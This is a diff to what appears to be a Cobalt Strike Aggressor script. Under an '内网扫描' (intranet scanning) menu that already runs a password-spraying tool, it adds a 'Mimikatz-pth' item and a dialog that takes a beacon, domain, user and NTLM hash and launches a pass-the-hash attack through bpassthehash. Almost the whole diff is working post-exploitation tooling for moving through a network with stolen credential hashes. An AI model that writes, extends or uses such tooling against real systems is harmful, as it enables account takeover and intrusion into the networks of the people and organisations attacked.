@@ -197,4 +197,24 @@ menu "内网扫描" {
     bexecute_assembly($bid, script_resource("/scripts/Intranet scanning/SharpSpray.exe"), $arg);
   }
 
+  item "Mimikatz-pth"{
+    local('$bid');
+    foreach $bid ($1){
+      mimikatz_passthehash($bid);
+    }
+  }
+  sub mimikatz_passthehash{
+  	$bid = $1;
+  	$dialog = dialog("Pass-The-Hash" , %(beacon => $1 , domain => "xxx.com" , user => "administrator" , hash => "hash") , lambda({
+      bpassthehash($3["beacon"] , $3["domain"] , $3["user"] , $3["hash"]);
+  	}));
+  	dialog_description($dialog, "mimikatz哈希传递攻击。");
+  	drow_text($dialog, "beacon",  "Beacon:");
+  	drow_text($dialog, "domain",  "Domain:");
+  	drow_text($dialog, "user",  "User:");
+  	drow_text($dialog, "hash",  "Hash:");
+  	dbutton_action($dialog, "Launch");
+  	dialog_show($dialog);
+  }
+
 }
